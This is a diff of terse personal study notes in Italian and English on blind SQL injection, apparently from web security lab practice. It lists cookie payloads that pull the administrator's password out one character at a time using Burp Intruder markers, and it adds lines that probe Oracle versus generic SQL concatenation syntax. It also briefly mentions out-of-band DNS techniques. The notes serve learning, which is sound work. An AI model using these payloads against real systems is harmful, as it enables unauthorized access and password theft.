@@ -94,6 +94,10 @@ TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LE
 TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§     -> extract every character from the password and confront it with a character --> intruder cluster bomb attack per automatizzare
 TrackingId=xyz' AND (SELECT SUBSTRING(password,§2§,1) FROM users WHERE username='administrator')='§a§    -> per la lunghezza della password
 
+da provare per verificare il sistema
+TrackingId=xyz'||(SELECT '' FROM dual)||'  -> oracle syntax
+TrackingId=xyz'||(SELECT '')||'   -> sql syntax
+
 OAST techniques
 genera DNS query spesso
 con collaborator si monta un dns server e ricevere le risposte
